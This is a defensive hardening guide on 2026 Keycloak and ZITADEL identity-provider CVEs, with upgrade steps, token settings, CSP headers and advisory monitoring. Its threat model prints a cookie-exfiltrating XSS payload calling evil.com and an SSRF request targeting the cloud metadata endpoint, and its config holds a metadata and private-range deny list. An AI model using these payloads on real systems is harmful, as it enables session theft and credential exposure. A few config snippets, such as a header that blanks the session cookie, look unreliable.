---
title: "Keycloak and ZITADEL Token Security Hardening"
description: "Harden Keycloak against the April-May 2026 multi-CVE batch—TOCTOU token reuse, SSRF, privilege escalation—and ZITADEL's CVE-2026-29191 critical XSS chain, with upstream advisory monitoring."
slug: keycloak-token-security
date: 2026-05-02
lastmod: 2026-05-02
category: cross-cutting
tags: ["keycloak", "zitadel", "token-security", "oauth", "cve-2026-1035", "cve-2026-29191", "identity", "toctou"]
personas: ["security-engineer", "platform-engineer", "sre"]
article_number: 365
difficulty: advanced
estimated_reading_time: 17
published: true
layout: article.njk
permalink: "/articles/cross-cutting/keycloak-token-security/index.html"
---

# Keycloak and ZITADEL Token Security Hardening

## Problem

Keycloak and ZITADEL are the two dominant open source identity providers (IdPs) used in production environments for authentication and authorization. Keycloak is the established leader — Red Hat-backed, with over a decade of production deployments and deep integration into the Java/Jakarta EE ecosystem. ZITADEL is a newer cloud-native alternative written in Go, gaining adoption particularly in Kubernetes-native stacks because it ships with a CockroachDB-backed multi-tenancy model and a Kubernetes operator. Both products implement OAuth 2.0, OpenID Connect, and SAML, and both serve as the centralised trust anchor for tokens used across dozens or hundreds of downstream services. That centralised role makes them high-value targets: a vulnerability in the IdP can grant attackers access to every service that delegates authentication to it.

In April and May 2026, Red Hat shipped Keycloak 26.4.11 through Red Hat Security Advisory RHSA-2026:6477 and RHSA-2026:6478, simultaneously patching 11 distinct CVEs. The breadth of this batch is itself a risk signal: when an IdP accumulates a double-digit CVE backlog, it indicates the product's security review cadence has fallen behind its rate of feature development. The highest-severity issues in the batch span three attack categories — token protocol violations, server-side request forgery, and privilege escalation — any one of which can result in full account compromise.

**CVE-2026-1035** is the most technically interesting of the batch: a TOCTOU (time-of-check to time-of-use) race condition in refresh token handling. OAuth 2.0 refresh tokens are intended to be single-use — when a client exchanges a refresh token for a new access token, the server should atomically revoke the original refresh token and issue a replacement. Keycloak's implementation contained a window between the token validity check and the revocation database write during which a second concurrent request using the same refresh token would also pass the validity check. An attacker who intercepts a valid refresh token — from a network tap, a leaked log file, a compromised browser, or a misconfigured token storage mechanism — can exploit this by sending two simultaneous token refresh requests. Both requests return valid access tokens. The victim's session continues uninterrupted, so there is no immediate revocation signal to the legitimate user.

**CVE-2026-1180** is a blind SSRF vulnerability in Keycloak's OIDC dynamic client registration endpoint. The OIDC Dynamic Client Registration specification (RFC 7591) allows a client to register itself by POSTing metadata including a `jwks_uri` — the URL where the client's public keys are published for signature verification. Keycloak fetched the `jwks_uri` server-side during registration without validating it against an allowlist or SSRF protection. An attacker with access to the registration endpoint (which can be anonymously accessible depending on realm configuration) could set `jwks_uri` to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` or other internal endpoints, causing Keycloak to issue HTTP requests to cloud metadata services or internal hosts. In environments where Keycloak runs with permissive egress network policies and debug logging enabled, the response body may be captured in logs.

**CVE-2026-3121** is a privilege escalation in the realm management permission model. Keycloak's admin API uses a role hierarchy where the `manage-clients` realm role is intended to grant management of OAuth clients within a realm but not broader realm administration. A boundary misconfiguration in the permission enforcement logic allowed a user holding only `manage-clients` to call APIs that should require the full `realm-admin` role, including user management and realm configuration writes. **CVE-2026-2366** compounds this: certain Admin REST API endpoints did not correctly enforce realm scope boundaries, potentially allowing cross-realm data access. The remaining seven CVEs in the batch cover information disclosure through error messages, UMA (User-Managed Access) policy bypass, token replay in device authorization flow, and insufficient `redirect_uri` validation.

ZITADEL's **CVE-2026-29191** (CVSS 9.3 Critical, disclosed March-April 2026, patched in v4.12.0) is a cross-site scripting vulnerability in ZITADEL's Login V2 interface at the `/saml-post` endpoint. SAML SP-initiated flows pass a `RelayState` parameter that the identity provider echoes back in the SAML POST binding response — this parameter is used by the service provider to restore the user's pre-authentication state. In ZITADEL's Login V2 implementation, the `RelayState` value was reflected into the HTML response without sanitization. An attacker who constructs a SAML authentication URL with a malicious `RelayState` value — for example, containing `<script>fetch('https://evil.com/?c='+document.cookie)</script>` — and delivers that URL to a victim causes the victim's browser to execute attacker-controlled JavaScript on the ZITADEL domain. Because the script runs in the ZITADEL origin, it can read session cookies (if HttpOnly is not set) and make authenticated API requests as the victim, enabling full account takeover without ever touching the victim's password.

ZITADEL's **CVE-2026-27945** is an SSRF in ZITADEL's Actions feature, which allows administrators to configure webhook target URLs that ZITADEL calls when identity lifecycle events occur (user creation, login, etc.). The target URL field was not validated against internal host ranges or RFC 1918 address space, enabling administrators with Actions configuration access to probe internal network endpoints through ZITADEL's outbound connections. This was patched in ZITADEL v4.11.1.

Both Keycloak and ZITADEL have disclosure processes that create a monitoring challenge. Keycloak's batch CVE disclosure pattern — 11 CVEs in a single Red Hat advisory — makes it difficult for operators to assess severity and prioritise patching in sequence. The Red Hat advisory (`https://access.redhat.com/security/vulnerabilities/keycloak`) is the authoritative source, but upstream Keycloak's GitHub Security Advisories often lag behind: some CVEs in the April-May batch were filed against the Red Hat build before the upstream Keycloak project published a corresponding GHSA. Several CVEs were initially reported as plain GitHub issues (publicly visible, describing the vulnerability) before Red Hat's coordinated disclosure date — creating a window during which the vulnerability details were public but no patch was available. ZITADEL's disclosure process is somewhat cleaner — they file GHSAs simultaneously with patches — but CVE-2026-29191's XSS was also reported via a public GitHub issue before the GHSA was filed. Effective monitoring requires watching both the Red Hat advisory feed and the upstream GitHub repositories.

**Target systems:** Keycloak < 26.4.11 (Red Hat build), upstream Keycloak < 26.1.x patched equivalent; ZITADEL < v4.12.0 (for CVE-2026-29191), < v4.11.1 (for CVE-2026-27945).

## Threat Model

1. **CVE-2026-1035 TOCTOU token reuse**: An attacker intercepts a valid refresh token — via network tap on an unencrypted internal link, from an application log that recorded the token, or from a compromised browser extension. The attacker writes a simple script that sends two simultaneous POST requests to `/realms/{realm}/protocol/openid-connect/token` with `grant_type=refresh_token` and the intercepted token value. Both requests complete within the TOCTOU window, each returning a valid access token with a new refresh token. The attacker now holds a valid session. The legitimate user's session also continues uninterrupted because they received their replacement tokens in the first response — there is no revocation signal, no alert, and no indication of compromise until the attacker takes a detectable action.

2. **CVE-2026-1180 SSRF via jwks_uri**: An attacker with network access to Keycloak's client registration endpoint (which is enabled by default in many realm configurations) sends a POST to `/realms/{realm}/clients-registrations/openid-connect` with `Content-Type: application/json` and a body containing `{"jwks_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "client_name": "legit-app", "redirect_uris": ["https://attacker.com/callback"]}`. Keycloak fetches the `jwks_uri` server-side. In AWS environments, this returns the instance's IAM role credentials in the response body. If Keycloak's DEBUG-level logging is active, the HTTP response from the metadata endpoint may be written to logs accessible to anyone with log aggregation access — broadening the blast radius from Keycloak compromise to full AWS account credential exposure.

3. **CVE-2026-29191 XSS to account takeover**: An attacker targeting a ZITADEL deployment constructs the URL `https://auth.company.com/ui/v2/saml-post?SAMLResponse=<base64-encoded-valid-response>&RelayState=%3Cscript%3Efetch%28%27https%3A%2F%2Fevil.com%2F%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E`. The attacker delivers this URL to a victim through phishing or a link in a legitimate-looking document. The victim's browser navigates to the URL, ZITADEL reflects the unescaped `RelayState` into the HTML response, and the script executes. Because it runs on the `auth.company.com` origin, it can read any non-HttpOnly cookies set on that domain, read session storage, and make fetch() requests to ZITADEL's API as the authenticated user — including API calls to add attacker-controlled SSO connections or modify MFA settings.

4. **Patch-gap exploitation**: The Keycloak 11-CVE batch is published in RHSA-2026:6477/6478 on a specific date. Operators running upstream Keycloak (not the Red Hat build) must wait for upstream Keycloak to publish equivalent patches for their version. The RHSA is public immediately; the upstream patch may follow days or weeks later. During that window, adversaries who read the RHSA can extract the vulnerability descriptions, identify affected code paths from public CVE references, and develop working exploits for unpatched upstream deployments. Self-managed Keycloak operators who track only the upstream project (not the Red Hat advisory) may not learn of the vulnerabilities until the upstream GitHub advisory is published — potentially weeks after the exploit has been available.

The blast radius of a successful IdP compromise is organisation-wide. Every service that delegates authentication to Keycloak or ZITADEL trusts tokens issued by the compromised instance. Token signing keys are stored in the IdP — if an attacker gains realm admin access, they can export signing keys and mint arbitrary tokens for any user in any service. Containment requires rotating all session tokens, all service account credentials, and the realm's token signing keys simultaneously — an expensive and disruptive operation that must be planned in advance.

## Configuration / Implementation

### Upgrading Keycloak and ZITADEL

Pull the patched Keycloak image and verify the version before deploying:

```bash
docker pull quay.io/keycloak/keycloak:26.4.11

# Verify the pulled image
docker run --rm quay.io/keycloak/keycloak:26.4.11 --version
```

For Helm-managed deployments:

```bash
helm upgrade keycloak bitnami/keycloak \
  --reuse-values \
  --set image.tag=26.4.11 \
  --namespace keycloak

# Verify the running version via the OIDC discovery endpoint
curl -s http://keycloak:8080/realms/master/.well-known/openid-configuration \
  | jq '.issuer'
```

For ZITADEL, upgrade to v4.12.0 to address both CVE-2026-29191 and CVE-2026-27945:

```bash
helm upgrade zitadel zitadel/zitadel \
  --reuse-values \
  --set zitadel.image.tag=v4.12.0 \
  --namespace zitadel

# Confirm ZITADEL is serving the expected version
curl -s https://auth.company.com/system/healthz | jq .
```

### Refresh Token Hardening (CVE-2026-1035 Mitigation)

Keycloak's TOCTOU vulnerability is most effectively mitigated by enabling strict single-use refresh token semantics at the realm level. In the Keycloak Admin Console, navigate to **Realm Settings > Tokens**:

- **Revoke Refresh Token**: `ON`
- **Refresh Token Max Reuse**: `0`
- **Refresh Token Max**: `900` (15 minutes)

These settings cause Keycloak to enforce token revocation atomically at the database level and reject any attempt to use a refresh token more than once. Via the kcadm CLI:

```bash
# Configure strict refresh token settings for a realm
kcadm.sh update realms/myrealm \
  -s revokeRefreshToken=true \
  -s refreshTokenMaxReuse=0 \
  -s ssoSessionMaxLifespan=900 \
  --server http://localhost:8080 \
  --realm master \
  --user admin \
  --password "${KCADM_PASSWORD}"
```

Verify the mitigation by attempting to use the same refresh token twice in rapid succession:

```bash
# First use — should succeed
RESPONSE=$(curl -s -X POST http://keycloak:8080/realms/myrealm/protocol/openid-connect/token \
  -d "grant_type=refresh_token&refresh_token=${REFRESH_TOKEN}&client_id=myclient")
echo "First response: $(echo $RESPONSE | jq -r '.token_type // .error')"

# Second use of the same token — must return invalid_grant
curl -s -X POST http://keycloak:8080/realms/myrealm/protocol/openid-connect/token \
  -d "grant_type=refresh_token&refresh_token=${REFRESH_TOKEN}&client_id=myclient" \
  | jq -r '.error'
# Expected output: invalid_grant
```

### Disabling Dynamic Client Registration (CVE-2026-1180 Mitigation)

Unless your deployment specifically requires self-service client onboarding, disable anonymous dynamic client registration:

In the Keycloak Admin Console, navigate to **Realm Settings > Client Registration > Client Registration Policies**:

- Remove or disable the **Anonymous Client Registration Policy**
- Require **Authenticated Client Registration** with a registration access token scoped to specific trusted parties

If dynamic registration is operationally required, apply SSRF validation via the **Trusted Hosts** client registration policy:

```bash
# Create a trusted hosts policy restricting jwks_uri resolution
kcadm.sh create client-registration-policy \
  -r myrealm \
  -s name="TrustedHostsPolicy" \
  -s providerId="trusted-hosts" \
  -s 'config={"trusted-hosts": ["keys.internal.company.com", "jwks.internal.company.com"], "host-sending-registration-request-must-match": ["true"], "client-uris-must-match": ["true"]}' \
  --server http://localhost:8080 \
  --realm master \
  --user admin \
  --password "${KCADM_PASSWORD}"

# Verify anonymous registration is blocked
curl -s -X POST http://keycloak:8080/realms/myrealm/clients-registrations/openid-connect \
  -H "Content-Type: application/json" \
  -d '{"client_name": "test", "redirect_uris": ["https://attacker.com/callback"], "jwks_uri": "http://169.254.169.254/"}' \
  | jq -r '.error // "REGISTRATION SUCCEEDED — CHECK CONFIG"'
# Expected: registration_error or 401
```

### ZITADEL Actions Target URL Allowlist (CVE-2026-27945 Mitigation)

If your ZITADEL deployment does not use the Actions feature, disable it entirely in `zitadel.yaml`:

```yaml
# zitadel.yaml — disable Actions if unused
Features:
  Actions:
    Enabled: false
```

If Actions are required, restrict the HTTP target URL patterns to an explicit allowlist:

```yaml
# zitadel.yaml — restrict Action webhook targets
Actions:
  AllowedHTTPHostPatterns:
    - "https://webhooks.internal.company.com/*"
    - "https://automation.internal.company.com/hooks/*"
  # Deny RFC 1918 ranges and cloud metadata endpoints
  DenyHTTPTargets:
    - "169.254.169.254"
    - "10.0.0.0/8"
    - "172.16.0.0/12"
    - "192.168.0.0/16"
```

Apply the configuration and restart the ZITADEL pods:

```bash
kubectl create secret generic zitadel-config \
  --from-file=zitadel.yaml=./zitadel.yaml \
  --namespace zitadel \
  --dry-run=client -o yaml | kubectl apply -f -

kubectl rollout restart deployment/zitadel -n zitadel
kubectl rollout status deployment/zitadel -n zitadel
```

### CSP Headers to Mitigate XSS Impact (CVE-2026-29191 Defence-in-Depth)

Even with ZITADEL v4.12.0 installed, applying a strict Content Security Policy via your reverse proxy prevents future XSS vulnerabilities from being exploitable and reduces session cookie exposure. Add the following to your nginx reverse proxy configuration for the ZITADEL and Keycloak vhosts:

```nginx
# /etc/nginx/conf.d/zitadel.conf
server {
    listen 443 ssl;
    server_name auth.company.com;

    # CSP: restrict script execution to same-origin and nonce-tagged scripts only
    set $csp_nonce $request_id;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-${csp_nonce}'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; form-action 'self';" always;

    # Prevent session cookie theft even if XSS fires
    add_header Set-Cookie "SESSION=; HttpOnly; Secure; SameSite=Strict" always;

    # Additional hardening headers
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;

    location / {
        proxy_pass http://zitadel:8080;
        proxy_set_header X-Request-ID $request_id;
    }
}
```

Verify the CSP is applied:

```bash
curl -sI https://auth.company.com | grep -i content-security-policy
# Expected: Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-...
```

For Keycloak themes that include inline scripts, the nonce must be injected into the Freemarker templates. In `base/login/template.ftl`:

```html
<!-- Pass the nginx-generated nonce into Keycloak theme scripts -->
<script nonce="${properties.kcNonce!''}">
  /* existing inline script content */
</script>
```

Pass the nonce via the `X-Request-ID` header forwarded by nginx, or generate it server-side in a Keycloak authenticator SPI.

### Privilege Boundary Enforcement (CVE-2026-3121 Mitigation)

Audit all realm-management role assignments to identify service accounts or users holding `manage-clients` or broader roles that should have narrower permissions:

```bash
# List all users with manage-clients or realm-admin roles in a realm
kcadm.sh get users -r myrealm \
  --server http://localhost:8080 \
  --realm master \
  --user admin \
  --password "${KCADM_PASSWORD}" \
  --fields username,id | jq -r '.[].id' | while read user_id; do
    roles=$(kcadm.sh get-roles -r myrealm --uid "$user_id" --cclientid realm-management \
      --server http://localhost:8080 --realm master --user admin --password "${KCADM_PASSWORD}" 2>/dev/null \
      | jq -r '.[].name' | grep -E "manage-clients|realm-admin|manage-users")
    if [ -n "$roles" ]; then
      username=$(kcadm.sh get users/"$user_id" -r myrealm \
        --server http://localhost:8080 --realm master --user admin --password "${KCADM_PASSWORD}" \
        | jq -r '.username')
      echo "$username: $roles"
    fi
  done
```

For service accounts that only need to read client configuration, replace `manage-clients` with `view-clients`:

```bash
# Remove manage-clients, grant view-clients only
kcadm.sh remove-roles -r myrealm \
  --uusername svc-deployer \
  --cclientid realm-management \
  --rolename manage-clients \
  --server http://localhost:8080 --realm master --user admin --password "${KCADM_PASSWORD}"

kcadm.sh add-roles -r myrealm \
  --uusername svc-deployer \
  --cclientid realm-management \
  --rolename view-clients \
  --server http://localhost:8080 --realm master --user admin --password "${KCADM_PASSWORD}"
```

Enable fine-grained realm admin permissions (Keycloak Admin Console: **Realm Settings > General > Admin Permissions: ON**) to allow per-resource permission grants instead of broad role assignments.

### Monitoring Keycloak and ZITADEL Advisories

Set up automated advisory monitoring across all three upstream sources:

```bash
# Check Red Hat Keycloak advisories (requires jq and curl)
curl -s "https://access.redhat.com/labs/securitydataapi/cve.json?package=keycloak&after=$(date -d '30 days ago' +%Y-%m-%d)" \
  | jq -r '.[] | "\(.CVE) \(.severity) \(.public_date[:10]) \(.bugzilla_description)"'

# Check upstream Keycloak GitHub Security Advisories
gh api repos/keycloak/keycloak/security/advisories \
  --jq '.[].summary'

# Check ZITADEL GitHub Security Advisories
gh api repos/zitadel/zitadel/security/advisories \
  --jq '.[].summary'

# Watch Keycloak commits in token-handling and authorization paths
gh api repos/keycloak/keycloak/commits \
  --jq '.[] | select(.commit.message | test("refresh|SSRF|XSS|privilege|token.*reuse"; "i")) | "\(.sha[:8]) \(.commit.message | split("\n")[0])"'
```

For Renovate-managed Helm chart updates, add the following to `renovate.json`:

```json
{
  "packageRules": [
    {
      "matchPackageNames": ["bitnami/keycloak", "zitadel/zitadel"],
      "groupName": "identity-providers",
      "schedule": ["at any time"],
      "stabilityDays": 0,
      "labels": ["security", "identity"],
      "prPriority": 10
    }
  ]
}
```

Key files to watch for security-relevant commits in the upstream Keycloak repository:
- `services/src/main/java/org/keycloak/authorization/` — authorization policy enforcement
- `core/src/main/java/org/keycloak/representations/RefreshToken.java` — token lifecycle
- `services/src/main/java/org/keycloak/protocol/oidc/` — OIDC protocol implementation including dynamic registration

## Expected Behaviour

| Signal | Unpatched Keycloak/ZITADEL | Patched + Hardened |
|---|---|---|
| Refresh token used twice simultaneously | Both requests return HTTP 200 with valid tokens; attacker holds a valid session alongside the legitimate user | Second request returns HTTP 400 `{"error": "invalid_grant"}`; only one session persists |
| Dynamic client registration with `jwks_uri: http://169.254.169.254/` | Keycloak fetches the URL server-side; registration succeeds or fails with metadata content in debug logs | Registration rejected with `registration_error: invalid jwks_uri host`; no outbound request is made |
| SAML POST with XSS payload in `RelayState` | JavaScript executes on the ZITADEL origin; session cookies readable by attacker script | ZITADEL v4.12.0 escapes `RelayState` before reflection; CSP blocks inline script execution even if escaping fails |
| User with `manage-clients` calling realm admin API | Privilege escalation succeeds; attacker gains realm admin capabilities | API returns HTTP 403; fine-grained permissions enforce boundary correctly |
| Red Hat RHSA published; upstream Keycloak package not yet updated | Operators tracking only upstream GitHub miss the advisory for days or weeks; deployment remains vulnerable during patch gap | Renovate + Red Hat RSS monitoring fires alert immediately on RHSA publication; patch applied before exploit is weaponised |

## Trade-offs

| Aspect | Benefit | Cost | Mitigation |
|---|---|---|---|
| Revoke Refresh Token strict mode (`Refresh Token Max Reuse: 0`) | Eliminates TOCTOU token reuse; enforces single-use semantics at database level | Breaks any application that caches a refresh token and retries on transient network failure (the retry will fail with `invalid_grant` on the cached token) | Instrument applications to always use the new refresh token from each response; alert on `invalid_grant` errors to surface misconfigured clients |
| Disabling anonymous dynamic client registration | Eliminates SSRF surface at the registration endpoint; prevents unauthenticated client enumeration | Breaks self-service client onboarding flows; development teams must request client registration through a centralised process | Implement a lightweight client provisioning API backed by an authenticated Keycloak service account; use Terraform or GitOps for client lifecycle |
| Short refresh token lifetime (15 minutes) | Limits the window of opportunity for intercepted refresh token misuse; aligns with NIST SP 800-63B session guidelines | Increases token exchange frequency; services with infrequent user interaction may see elevated authentication overhead | Use sliding session windows instead of fixed lifetimes where UX requires longer sessions; short refresh tokens + silent re-authentication are preferable to long-lived tokens |
| CSP nonce (requires server-side nonce generation per request) | Blocks XSS script execution even if a future sanitization bypass is found in Keycloak or ZITADEL themes | Requires nonce injection into Keycloak Freemarker templates and ZITADEL's Login V2; breaks third-party theme scripts that use inline JavaScript | Audit theme JavaScript and move inline scripts to external files with `integrity` attributes; use `nginx` `$request_id` as a nonce source |

## Failure Modes

| Failure | Symptom | Detection | Recovery |
|---|---|---|---|
| Revoke Refresh Token breaks mobile apps that cache refresh tokens | Mobile users are logged out unexpectedly; app shows authentication error on background token refresh; `invalid_grant` errors spike in Keycloak logs | Monitor `keycloak_failed_token_refresh_total` metric; alert on `invalid_grant` error rate > baseline; correlate with mobile client IDs | Identify the affected client IDs from logs; work with mobile app teams to implement correct token rotation (always store and use the newest refresh token from each response); consider a short grace period with `Refresh Token Max Reuse: 1` during the transition |
| ZITADEL Actions disabled breaks existing webhook workflows | External automation systems stop receiving identity lifecycle events; user provisioning in downstream systems fails silently | Monitor webhook delivery failure rates in downstream systems; check ZITADEL audit logs for action execution records | Re-enable Actions with `AllowedHTTPHostPatterns` restricted to known-good internal endpoints; audit all existing Action configurations before re-enabling |
| CSP blocks legitimate inline scripts in Keycloak themes | Login page renders without JavaScript; form submission fails; custom theme elements non-functional | Browser developer tools show CSP violation reports; enable CSP `report-uri` directive to capture violations server-side | Add nonce support to affected theme scripts; alternatively, temporarily add a `report-only` CSP to collect violations before enforcing; extract all inline scripts to external files |
| Red Hat Keycloak build lags behind upstream fix (wrong version pinned) | Operators upgrade to Red Hat's 26.4.11 build but the upstream Keycloak image (`quay.io/keycloak/keycloak`) does not yet contain equivalent patches; CI pins the upstream image | Version mismatch between Red Hat advisory target and upstream image tag; security scanner reports unpatched CVEs on deployed image | Pin to the Red Hat build at `registry.access.redhat.com/ubi9/keycloak:26.4.11`; cross-reference the RHSA with the upstream Keycloak changelog; do not assume identical patch content across Red Hat and upstream builds |

## Related Articles

- [OAuth 2.0 and OIDC Hardening](/articles/cross-cutting/oauth2-oidc-hardening/)
- [Identity Abuse and Credential Compromise](/articles/cross-cutting/identity-abuse-credential-compromise/)
- [Production Access Management](/articles/cross-cutting/production-access-management/)
- [MCP OAuth Security](/articles/ai-landscape/mcp-oauth-security/)
- [Vulnerability Management Program](/articles/cross-cutting/vulnerability-management-program/)
